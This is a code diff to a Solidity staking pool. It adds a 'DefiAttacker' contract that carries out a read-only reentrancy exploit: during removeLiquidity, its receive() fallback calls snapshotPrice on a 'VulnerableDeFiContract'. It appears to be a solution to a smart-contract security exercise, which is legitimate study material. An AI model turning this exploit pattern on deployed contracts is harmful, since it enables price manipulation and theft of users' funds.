@@ -5,7 +5,7 @@ import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
-
+import "hardhat/console.sol";
 // Users can stake ether in ReadOnlyPool
 // For each ether they contribute to the pool, they are minted an equal amount of
 // LPToken.
@@ -85,4 +85,21 @@ contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
 
     // @notice earn profits for the pool
     function earnProfit() external payable {}
+}
+contract DefiAttacker {
+    VulnerableDeFiContract public vulnerableDefiContract;
+    ReadOnlyPool public pool;
+
+    constructor(VulnerableDeFiContract _vulnerableDefiContract, ReadOnlyPool _pool) {
+        vulnerableDefiContract = _vulnerableDefiContract;
+        pool = _pool;
+    }
+    receive() external payable {
+        vulnerableDefiContract.snapshotPrice();
+    }
+
+    function attack() external payable {
+        pool.addLiquidity{value: msg.value}();
+        pool.removeLiquidity();
+    }
 }
